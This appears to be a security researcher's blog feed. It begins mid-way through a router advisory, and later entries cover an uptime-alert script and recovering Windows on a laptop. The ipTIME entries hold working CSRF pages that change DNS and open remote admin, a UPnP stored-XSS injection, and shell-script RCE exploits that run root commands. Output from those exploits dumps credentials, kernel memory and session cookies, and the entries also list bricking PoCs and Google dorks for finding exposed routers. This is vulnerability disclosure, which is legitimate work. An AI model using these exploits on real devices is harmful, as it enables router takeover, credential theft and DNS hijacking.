&lt;input type="hidden" name="SET0" value="17367296=31337"&gt;
&lt;input type="hidden" name="SET1" value="17236224=1"&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;


o Changing the DNS configuration to 0.2.0.7 and 1.2.0.1:

&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
function s() {
document.f.submit();
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload="s()"&gt;
&lt;form id="f" name="f" method="POST" action="http://192.168.0.1/do_cmd.htm"&gt;
&lt;input type="hidden" name="CMD" value="WAN"&gt;
&lt;input type="hidden" name="GO" value="netconf_wansetup.html"&gt;
&lt;input type="hidden" name="SET0" value="50397440=2"&gt;
&lt;input type="hidden" name="SET1" value="50856960=64-E5-99-AA-AA-AA"&gt;
&lt;input type="hidden" name="SET2" value="235077888=1"&gt;
&lt;input type="hidden" name="SET3" value="235012865=0.2.0.7"&gt;
&lt;input type="hidden" name="SET4" value="235012866=1.2.0.1"&gt;
&lt;input type="hidden" name="SET5" value="51118336=0"&gt;
&lt;input type="hidden" name="SET6" value="51839232=1"&gt;
&lt;input type="hidden" name="SET7" value="51511552=1500"&gt;
&lt;input type="hidden" name="SET8" value="117834240="&gt;
&lt;input type="hidden" name="SET9" value="117703168="&gt;
&lt;input type="hidden" name="SET10" value="117637376=1492"&gt;
&lt;input type="hidden" name="SET11" value="51446016=1500"&gt;
&lt;input type="hidden" name="SET12" value="50463488=192.168.1.1"&gt;
&lt;input type="hidden" name="SET13" value="50529024=255.255.255.0"&gt;
&lt;input type="hidden" name="SET14" value="50594560=192.168.1.254"&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;


The variable GO is an open redirect. Any URL like http://www.google.com/ for instance can be used.
The variable GO is also vulnerable to XSS. It's out of scope in this advisory.


To bypass the protection (which checks the refer), you can, for example, base64 the form and include
it in the webpage.
The refer will be empty and the CSRF will be accepted by the device:



o activate_admin_wan_csrf_bypass.html:

&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Refresh" content="1;url=data:text/html;charset=utf8;base64,PGh0bWw+CjxoZWFkPgo8c2NyaXB0PgpmdW5jdGlvbiBzKCkgewogIGRvY3VtZW50LmYuc3VibWl0KCk7Cn0KPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHkgb25sb2FkPSJzKCkiPgo8Zm9ybSBpZD0iZiIgbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249Imh0dHA6Ly8xOTIuMTY4LjAuMS9kb19jbWQuaHRtIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iQ01EIiB2YWx1ZT0iU1lTIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iR08iIHZhbHVlPSJmaXJld2FsbGNvbmZfYWNjZXNzbGlzdC5odG1sIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ibm93YWl0IiB2YWx1ZT0iMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDAiIHZhbHVlPSIxNzM2NzI5Nj0zMTMzNyI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEiIHZhbHVlPSIxNzIzNjIyND0xIj4KPC9mb3JtPgo8L2JvZHk+CjwvaHRtbD4K"&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;


Visiting activate_admin_wan_csrf_bypass.html in a remote location will activate
the remote management interface on port 31337/TCP.

You can test it through http://pierrekim.github.io/advisories/2015-iptime-0x01-PoC-change_dns_csrf_bypass.html



o change_dns_csrf_bypass.html:

&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Refresh" content="1;url=data:text/html;charset=utf8;base64,PGh0bWw+CjxoZWFkPgo8c2NyaXB0PgpmdW5jdGlvbiBzKCkgewogIGRvY3VtZW50LmYuc3VibWl0KCk7Cn0KPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHkgb25sb2FkPSJzKCkiPgo8Zm9ybSBpZD0iZiIgbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249Imh0dHA6Ly8xOTIuMTY4LjAuMS9kb19jbWQuaHRtIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iQ01EIiB2YWx1ZT0iV0FOIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iR08iIHZhbHVlPSJuZXRjb25mX3dhbnNldHVwLmh0bWwiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQwIiB2YWx1ZT0iNTAzOTc0NDA9MiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEiIHZhbHVlPSI1MDg1Njk2MD02NC1FNS05OS1BQS1BQS1BQSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDIiIHZhbHVlPSIyMzUwNzc4ODg9MSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDMiIHZhbHVlPSIyMzUwMTI4NjU9MC4yLjAuNyI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDQiIHZhbHVlPSIyMzUwMTI4NjY9MS4yLjAuMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDUiIHZhbHVlPSI1MTExODMzNj0wIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUNiIgdmFsdWU9IjUxODM5MjMyPTEiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQ3IiB2YWx1ZT0iNTE1MTE1NTI9MTUwMCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDgiIHZhbHVlPSIxMTc4MzQyNDA9Ij4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUOSIgdmFsdWU9IjExNzcwMzE2OD0iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQxMCIgdmFsdWU9IjExNzYzNzM3Nj0xNDkyIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUMTEiIHZhbHVlPSI1MTQ0NjAxNj0xNTAwIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUMTIiIHZhbHVlPSI1MDQ2MzQ4OD0xOTIuMTY4LjEuMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEzIiB2YWx1ZT0iNTA1MjkwMjQ9MjU1LjI1NS4yNTUuMCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDE0IiB2YWx1ZT0iNTA1OTQ1NjA9MTkyLjE2OC4xLjI1NCI+CjwvZm9ybT4KPC9ib2R5Pgo8L2h0bWw+Cg=="&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;


Visiting activate_admin_wan_csrf_bypass.html in a remote location will change the DNS servers
provided by the ipTIME device in the LAN.

You can test it through http://pierrekim.github.io/advisories/2015-iptime-0x01-PoC-activate_admin_wan_csrf_bypass.html



## Details - stored XSS and fun

There is a stored XSS, which can be injected using UPNP from the LAN, without authentication:

upnp&gt; host send 0 WANConnectionDevice WANIPConnection AddPortMapping

Required argument:
Argument Name:  NewPortMappingDescription
Data Type:      string
Allowed Values: []
Set NewPortMappingDescription value to: &lt;script&gt;alert("XSS");&lt;/script&gt;

Required argument:
Argument Name:  NewLeaseDuration
Data Type:      ui4
Allowed Values: []
Set NewLeaseDuration value to: 0

Required argument:
Argument Name:  NewInternalClient
Data Type:      string
Allowed Values: []
Set NewInternalClient value to: &lt;script&gt;alert("XSS");&lt;/script&gt;

Required argument:
Argument Name:  NewEnabled
Data Type:      boolean
Allowed Values: []
Set NewEnabled value to: 1

Required argument:
Argument Name:  NewExternalPort
Data Type:      ui2
Allowed Values: []
Set NewExternalPort value to: 80

Required argument:
Argument Name:  NewRemoteHost
Data Type:      string
Allowed Values: []
Set NewRemoteHost value to: &lt;script&gt;alert("XSS");&lt;/script&gt;

Required argument:
Argument Name:  NewProtocol
Data Type:      string
Allowed Values: ['TCP', 'UDP']
Set NewProtocol value to: TCP

Required argument:
Argument Name:  NewInternalPort
Data Type:      ui2
Allowed Values: []
Set NewInternalPort value to: 80


upnp&gt;


The UPNP webpage in the administration area (http://192.168.0.1/popup_upnp_portmap.html) will show:

[...]
&lt;tr&gt;
&lt;td class=item_td&gt;TCP&lt;/td&gt;
&lt;td class=item_td&gt;21331&lt;/td&gt;
&lt;td class=item_td&gt;&lt;script&gt;alert("XSS")&lt;script&gt;alert("XSS");&lt;/script&gt;:28777&lt;/td&gt;
&lt;td class=item_td&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;&lt;/td&gt;
&lt;/tr&gt;
[...]


- From my research, there are some bits overflapping with others, resulting in showing funny ports
and truncating input data. A remote DoS against the upnpd process seems to be easily done.

Gaining Remote Code Execution by UPNP exploitation is left as a exercise for the reader.



## Vendor Response

- From my experience, contacting EFMNetworks ipTIME proved to be useless.
They don't publish security information in the changelog, they don't answer to security researchers and
they don't credit them either.
EFMNetworks ipTIME was not contacted in regard of this case.



## Report Timeline

* Apr 20, 2015: Vulnerabilities found by Pierre Kim.
* Jun 20, 2015: Vulnerabilities confirmed with reliable PoCs.
* Jul 03, 2015: A public advisory is sent to security mailing lists.



## Credit

These vulnerabilities were found by Pierre Kim (@PierreKimSec).



## Greetings

Big thanks to Alexandre Torres.



## References

https://pierrekim.github.io/advisories/2015-iptime-0x01.txt
https://pierrekim.github.io/blog/2015-07-03-iptime-n104r3-vulnerable-to-CSRF-and-XSS-attacks.html



## Disclaimer

This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJVlbX6AAoJEMQ+Dtp9ky28I3AP/jAFTG1dEaWAFdqA1Vbagdyl
kIM22Gl+m4owJ5zYcJPahAsXAyHiigiA3bFFqC2TlRHZbIdFqsDXK2vM02uWi+KS
UiEl98VODDOjVqRj2x/f67qjU2vYWuS6TwT1OsjwMOnGOizHwqpqtQ1bLE6STKdY
9piABt9QZ4aw/CQk+32LEYO4jFHn75/9uncjP0tWblfE+7C7YrFF9F4Yg60m59R1
UuT0pvgLGHBpUw/VDCazGLJvd09jDQDlBQp7RraRrMPptmRvzhLVwQRaYwugWeqa
bGEIgclf5kbWO+LHRLvhkXtoDnw7TcEzR4+pXU3RUgA+Plz5z+9RR4chvAR116v/
0ZydSGdR1zaQWymU5KzZ2MadITw+T2iOjU2i8r7qluC1NX3YK7FVRz6TVlm5UVUj
Y5tg0PZ0vFsazPqa/TA26t+r9KrmjUJTuPPeecv5w3T6Y5Hl+MrMoaTl5MbXQD2b
bigs+7UsN7jPIY75PHfDrWyiDcqfx9Ra5vrRlt2SSg9oD3qXyX15OmsoDJYJ1xvG
cHrwXpOoiWC5rzQj6g6PNUqUbUyMdoXuoAbMyLXEQ6paKJ69pbVli4qIfakvZFNB
yoKdR13Q+j32YDbGuRcC3uOkkrt5/hW+yTrijs2WdfN5GviuGx4lob2FAQGcmGSo
UH4RwA7mV/6Pm3ZOYG0I
=9xXM
-----END PGP SIGNATURE-----
</code></pre></content>
    </entry>
    
    <entry>
        <title>Exploit Code for ipTIME firmwares < 9.58 RCE with root privileges against 127 router models</title>
        <link href="2015-07-01-poc-with-RCE-against-127-iptime-router-models.html"/>
        <content type="html"><h2>Disclaimer</h2>
<pre><code>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
</code></pre>
<p>As stated in <a href="https://pierrekim.github.io/blog/2015-04-20-112-iptime-routers-wifiaps-modems-firewalls-models-vulnerable-with-RCE-with-root-privileges.html">the precedent advisories</a>, ipTIME firmwares prior to 9.58 version are vulnerable to a remote code execution which gives root privileges.</p>
<p>From product_db extracted from a live ipTIME system, it concerns at least these devices:</p>
<pre><code>g1 g104a g104be g104i g104m g501 i1601 ic416 ic426 in524 ip0526 ip300 ip409 ip410 ip416 ip418 ip419
ip422 ip449 ip802 ip803 n104 n104a n104i n104m n2 n3004 n5004 n504 n6004 n604 n604i n604m n7004
n704 n704m nx505 q1 q304 q504 t1004 t1008 t2008 tq204 tv104 tv108 tv116 tv124 x1005 x3003 x5007 z54g
</code></pre>
<p>By analysis updated firmwares, <a href="https://pierrekim.github.io/blog/2015-05-05-127-iptime-routers-wifiaps-modems-firewalls-models-vulnerable-with-RCE-with-root-privileges.html">in total 127 devices were affected</a>:</p>
<pre><code>a1004 a1004v a104 a104ns a104r a2004 a2004ns a2004r a2008 a3004 a3004ns a5004ns a604 a604v extac extd2
g1 g104 g104a g104be g104i g104m g204 g501 g504 ipsmart mini mobap1 multi n1 n104 n104a n104ar1 n104i
n104k n104ktt n104m n104p n104q n104r n104r3 n104rsk n104s n104sr1 n104t n104v n104vlg n1e n1eky n1p
n2 n2e n2p n3004 n5 n5004 n504 n5r1 n6004 n6004m n6004r n604 n604a n604i n604m n604p n604r n604s
n604t n604v n604vlg n608 n7004ns n702bcm n704 n704a n704a3 n704bcm n704lg n704m n704mlg n704ns
n704s n704v n704v3 n8004 n8004r n8004v n804 n804a n804a3 n804t n804t3 n804v n904 n904ns n904v
ng104 ng304 ntq104 ntv108 ntv116 ntv124 q1 q304 q504 q604 t1004 t1008 t16000 t2008 t24000 t3004
t3008 timeve tq204 tv104 v1016 v1024 v304 v308 v504 wre1 x3003 x3007 x5007 x6003
</code></pre>
<p>Here are the working exploits:</p>
<p><strong>Exploit against the firmwares in ALL versions from 2008 to 2015 - until 9.50 firmware:</strong></p>
<pre><code>$ cat iptime.carnage.l2
#!/bin/sh

if [ ! $1 ]; then
  echo "Usage:"
  echo $0 ip command
  exit 1
fi

wget -qO- --post-data="echo 'Content-type: text/plain

'; PATH=$PATH:/sbin $2 $3 $4" http://$1/cgi-bin/sh
$
</code></pre>
<p><strong>Exploit against firmware v9.52:</strong></p>
<pre><code>$ cat iptime.carnage.l2.v9.52 
#!/bin/sh

if [ ! $1 ]; then
  echo "Usage:"
  echo $0 ip command
  exit 1
fi

wget -qO- --post-data="echo 'Content-type: text/plain

'; PATH=$PATH:/sbin:/bin $2 $3 $4" http://$1/sess-bin/sh
$
</code></pre>
<p><a href="http://pierrekim.github.io/advisories/">The exploits have been written in HTML/JavaScript allowing people to test their systems in live using their browsers!</a></p>
<p>Now we test the exploits in my lab!</p>
<p><strong>How to retrieve the credentials ? (see login and password at the end of the text file)</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-dump.configuration.including.credentials.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-dump.configuration.including.credentials.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-dump.configuration.png" /></p>
<p>Using CLI:</p>
<pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 cat /tmp/etc/iconfig.cfg
wantype.wan1=dynamic
dhblock.eth1=0
ppp_mtu=1454
fakedns=0
upnp=1
ppp_mtu=1454
timeserver=time.windows.com,gmt23,1,540,0
wan_ifname=eth1
auto_dns=1
dhcp_auto_detect=0
wireless_ifmode+wlan0=wlan0,0
dhcpd=1
lan_ip=192.168.0.1
lan_netmask=255.255.255.0
dhcpd_conf=br0,192.168.0.2,192.168.0.254,192.168.0.1,255.255.255.0
dhcpd_dns=164.124.101.2,168.126.63.2
dhcpd_opt=7200,30,200,
dhcpd_configfile=/etc/udhcpd.conf
dhcpd_lease_file=/etc/udhcpd.leases
dhcpd_static_lease_file=/etc/udhcpd.static
http_auth=session
use_captcha=1
login=test
password=test
org_hwaddr.eth1=90:9F:XX:XX:XX
nat_passthrough=0
kali#
</code></pre>
<p>Login and password are stored in plaintext, which is a very bad security practice.</p>
<p><strong>Listing of the filesystem</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-listing.of.the.root.filesystem.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-listing.of.the.root.filesystem.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-ls-latrR-root.png" /></p>
<p><strong>Current running process:</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-current.process.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-current.process.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-ps.png" /></p>
<p>Using CLI:</p>
<pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 ps -auxww
  PID  Uid     VmSize Stat Command
    1 root        720 S   init single 
    2 root            SW  [keventd]
    3 root            RWN [ksoftirqd_CPU0]
    4 root            SW  [kswapd]
    5 root            SW  [bdflush]
    6 root            SW  [kupdated]
    7 root            SW  [mtdblockd]
  252 root       1176 S   /sbin/dhcpd 
  270 root        436 S   apcpd 
  272 root        432 S   /sbin/iptables-q 
  299 root        372 S   /bin/wscd -start -c /var/wsc.conf -w wlan0 -fi /var/w
  303 root        260 S   /bin/iwcontrol wlan0 
  463 root        684 S   httpd 
  496 root        288 S   /bin/sh 
  498 root        300 R   ps -auxww 
kali#
</code></pre>
<p><strong>Getting the kernel memory:</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-getting.kernel.memory.html">An online POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-getting.kernel.memory.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-dump.mem.png" /></p>
<p>Using CLI:</p>
<pre><code>./iptime.carnage.l2.v9.52 192.168.0.1 cat /proc/kcore
</code></pre>
<p>The device runs Linux 2.4.18, 12 year old Linux, full of CVEs (local AND <em>remote</em>):</p>
<pre><code>&lt;4&gt;Linux version 2.4.18-MIPS-01.00 (rtlwl@ski) (gcc version 3.4.6-1.3.6) #128 Tue Feb 10 10:57:17 KST 2015
&lt;4&gt;early printk enabled 
&lt;4&gt;Determined physical RAM map:
&lt;4&gt; memory: 01000000 @ 00000000 (usable)
&lt;4&gt;On node 0 totalpages: 4096
&lt;4&gt;zone(0): 4096 pages.
&lt;4&gt;zone(1): 0 pages.
&lt;4&gt;zone(2): 0 pages.
&lt;4&gt;Kernel command line: root=/dev/mtdblock1 console=0 single
&lt;4&gt;Calibrating delay loop... 399.76 BogoMIPS
&lt;4&gt;Memory: 9500k/16384k available (2310k kernel code, 6884k reserved, 416k data, 60k init, 0k highmem)
&lt;4&gt;Dentry-cache hash table entries: 2048 (order: 2, 16384 bytes)
&lt;4&gt;Inode-cache hash table entries: 1024 (order: 1, 8192 bytes)
&lt;4&gt;Mount-cache hash table entries: 512 (order: 0, 4096 bytes)
&lt;4&gt;Buffer-cache hash table entries: 1024 (order: 0, 4096 bytes)
&lt;4&gt;Page-cache hash table entries: 4096 (order: 2, 16384 bytes)
</code></pre>
<p><strong>Grabbing the valid HTTP authentication cookies:</strong></p>
<pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 cat /proc/kcore | strings | grep Cookie

Cookie: efm_session_id=iNYV3r097DPbMDWu
Cookie: efm_session_id=iNYV3r097DPbMDWu
Cookie: efm_session_id=i3HJh4V15YLkf2l2
Cookie: efm_session_id=i3HJh4V15YLkf2l2
Cookie: efm_session_id=iNYV3r097DPbMDWu
Cookie: efm_session_id=iNYV3r097DPbMDWu
Cookie: efm_session_id=i3HJh4V15YLkf2l2
Cookie: efm_session_id=i3HJh4V15YLkf2l2
Cookie: efm_session_id=i3HJh4V15YLkf2l2
Cookie: efm_session_id=iNYV3r097DPbMDWu
Cookie: efm_session_id=iNYV3r097DPbMDWu
Cookie: efm_session_id=iNYV3r097DPbMDWu
</code></pre>
<p><strong>Default firewall rules:</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-default.firewall.rules.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-default.firewall.rules.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-iptables.png" /></p>
<p>Using CLI:</p>
<pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 iptables -nL

Chain INPUT (policy DROP)
target     prot opt source               destination
DROP       47   --  0.0.0.0/0            0.0.0.0/0
DROP       tcp  --  0.0.0.0/0            0.0.0.0/0          tcp dpt:1723
radius2g   all  --  0.0.0.0/0            0.0.0.0/0
ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0          tcp spt:25
ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0          tcp dpt:80
ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0
ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0          udp dpts:67:68
ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0          udp spt:53
ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0          tcp spt:80
ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0          udp spt:36500
ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0          udp dpts:33434:33600
ACCEPT     icmp --  192.168.0.1          192.168.0.1        icmp type 8

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination
TCPMSS     tcp  --  0.0.0.0/0            0.0.0.0/0          tcp flags:0x06/0x02 TCPMSS clamp to PMTU
app_filter  all  --  0.0.0.0/0            0.0.0.0/0
app_forward  all  --  0.0.0.0/0            0.0.0.0/0

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination

Chain app_filter (1 references)
target     prot opt source               destination

Chain app_forward (1 references)
target     prot opt source               destination

Chain ext_accesslist (0 references)
target     prot opt source               destination
DROP       tcp  --  0.0.0.0/0            0.0.0.0/0          tcp dpt:80

Chain int_accesslist (0 references)
target     prot opt source               destination
RETURN     all  --  0.0.0.0/0            192.168.255.250
RETURN     all  --  0.0.0.0/0            192.168.255.1
DROP       tcp  --  0.0.0.0/0            0.0.0.0/0          tcp dpt:80

Chain plantynet (0 references)
target     prot opt source               destination
plantynet_free  all  --  0.0.0.0/0            0.0.0.0/0
QUEUE      tcp  --  0.0.0.0/0            0.0.0.0/0          multiport dports 80,8080

Chain plantynet_free (1 references)
target     prot opt source               destination

Chain radius2g (1 references)
target     prot opt source               destination

Chain upnp (0 references)
target     prot opt source               destination
</code></pre>
<p><strong>Opening the management interface on the WAN:</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-opening.the.firewall.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-opening.the.firewall.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-flushing.iptables.png" /></p>
<p><strong>Architecture:</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52.grabbing.cpu.info.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52.grabbing.cpu.info.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-proc-cpuinfo.png" /></p>
<p>Using CLI:</p>
<pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 cat /proc/cpuinfo

system type             : Philips Nino
processor               : 0
cpu model               : R3000 V0.0
BogoMIPS                : 399.76
wait instruction        : yes
microsecond timers      : no
tlb_entries             : 32
extra interrupt vector  : no
hardware watchpoint     : no
VCED exceptions         : not available
VCEI exceptions         : not available
ll emulations           : 0
sc emulations           : 0
</code></pre>
<p><strong>Reboot the device:</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-reboot.html">An JavaScript online POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-reboot.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-reboot.png" /></p>
<p><strong>Brick the device:</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-bricking.the.device.html">An online POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-bricking.the.device.html">(exploit for version 9.52)</a></p>
<p><strong>By the way, d.cgi in /bin/ is an intentional backdoor from ipTIME.</strong></p>
<p>Uploading and executing a botnet client is left as an exercise to the reader.</p>
<p>More fun from iptime products is coming ~~~</p>
<p>Follow me on Twitter <a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>.</p>
<h2>Google Dork:</h2>
<pre><code>inurl:timepro.cgi
iptime.org ddns
inurl:iptime.org
</code></pre></content>
    </entry>
    
    <entry>
        <title>Small monitoring system using Freemobile</title>
        <link href="2015-06-23-small-monitoring-system-using-freemobile.html"/>
        <content type="html"><p>Hello,</p>
<p>In order to help a friend to monitor his webservices, I have written a small tool to check the availability of the different webservices.</p>
<p>The script is used with crontab and the <a href="https://mobile.free.fr/">Freemobile API</a> provides the possibility to send free SMS (free as a free beer). You can choose if you prefer SMS alerts, email alerts or both.
It checks the HTTP return code of the webpages : anything other than 200 will trigger the alert.</p>
<p>You have to edit:
  - ALERT_SMS_API
  - ALERT_EMAIL
  - LOGFILE
  - use_sms=y (by default, yes)
  - use_email=y (by default, yes)</p>
<pre><code>#!/bin/sh

# apt-get install screen curl mailutils

URL=$1

ALERT_SMS_API="https://smsapi.free-mobile.fr/sendmsg?user=USERID_FIXME&amp;pass=PASSWORD_FIXME&amp;msg="
ALERT_EMAIL="email@email0.com_FIXME email@email1.com_FIXME"
LOGFILE=/home/availability/alert.log

use_sms=y
use_email=y


umask 077

if [ ! $1 ]; then
  echo "usage $0 http://www.url.to/test"
  exit 1
fi

if [ ! -f "${LOGFILE}" ]; then
  touch "${LOGFILE}"
fi



alert() {
  current_date=$(date "+%Y-%m-%d %H:%m:%S")
  msg="${current_date} - ALERT on $1"

  echo "${msg} - alert()" &gt;&gt; ${LOGFILE}

  if [ ${use_sms} = "y" ]; then
    curl -sL -o /dev/null --insecure "${ALERT_SMS_API}${msg}"
    echo "${msg} - sms sent" &gt;&gt; ${LOGFILE}
  fi

  if [ ${use_email} = "y" ]; then
    for j in ${ALERT_EMAIL}
    do
      echo "${msg}" | mail -s "${msg}" ${j}
      echo "${msg} - email sent to ${j}" &gt;&gt; ${LOGFILE}
    done
  fi
}


curl 2&gt;/dev/null &gt;/dev/null
if [ $? -ne 2 ]; then
  alert "curl not found"
  exit
fi

output=$(curl -sL -w "%{http_code}\n" "$1" -o /dev/null --connect-timeout 5)

if [ $? -ne 0 ]; then
  alert ${URL}
  exit
fi

if [ "X${output}" != "X200" ]; then
  alert ${URL}
  exit
fi
</code></pre>
<p>The crontabs to check the webservices every 5 minutes are:</p>
<pre><code>*/5   *    *    *    *    /home/availability/alert-availability.sh http://domain.com/path/to/webservice0
*/5   *    *    *    *    /home/availability/alert-availability.sh http://domain.com/path/to/webservice1
*/5   *    *    *    *    /home/availability/alert-availability.sh http://domain.com/path/to/webservice2
*/5   *    *    *    *    /home/availability/alert-availability.sh http://domain.com/path/to/webservice3
</code></pre>
<p>This tool was tested on a Debian 7.6. So you need perhaps to run apt to install the necessary packages:</p>
<pre><code>apt-get install curl mailutils
</code></pre>
<p>You can see the past alerts as entries in the logfile:</p>
<pre><code>2015-05-01 13:10:02 - ALERT on http://www.XXX.XXX/status/XXXX - alert()
2015-05-01 13:10:02 - ALERT on http://www.XXX.XXX/status/XXXX - sms sent
2015-05-01 13:10:02 - ALERT on http://www.XXX.XXX/status/XXXX - email sent to email@email0.com_FIXME
2015-05-01 13:10:02 - ALERT on http://www.XXX.XXX/status/XXXX - email sent to email@email1.com_FIXME
</code></pre></content>
    </entry>
    
    <entry>
        <title>Recovering Windows on a "Windows-free" LG laptop</title>
        <link href="2015-06-09-recovering-windows-on-a-windows-free-lg-laptop.html"/>
        <content type="html"><p>Hello,</p>
<p>I just bought a new laptop, a <a href="http://search.daum.net/search?q=LG+13ZD950">LG 13ZD950</a>. This laptop can be purchased without Windows in South Korea (like a lot of new laptops in South Korea).</p>
<p>The "Windows-free" version doesn't boot on a system by default: you have to install your own OS.</p>
<p>Before installing Linux, I analyzed the internal SSD: even if the laptop is "Windows-free", Windows seems to be present but the laptop doesn't boot.</p>
<p>By default, you can only see a 10GB NTFS partition (/dev/sda1) called "DnA" containing 3GB of Windows drivers.</p>
<p>I will explain now how to recover a full Windows 8.1 factory copy available in the SSD.</p>
<p><strong>The laptop is brand new. According to S.M.A.R.T, the SSD is new too.</strong></p>
<p>Boot with <a href="https://www.kali.org/">Kali Linux</a> then use <strong>testdisk</strong> (from <a href="http://www.cgsecurity.org/">photorec</a>):</p>
<pre><code>kali% sudo testdisk /dev/sda
</code></pre>
<p><img alt="" src="images/lg-windows-testdisk-001.png" /></p>
<p>Use Intel/PC partition and Analyse the hard disk:</p>
<p><img alt="" src="images/lg-windows-testdisk-002.png" /></p>
<p>You will see the 10GB NTFS partition, called "DnA" containing 3GB of Windows drivers.</p>
<p><img alt="" src="images/lg-windows-testdisk-003.png" /></p>
<p>The Quick Search option discovered 2 new partitions:</p>
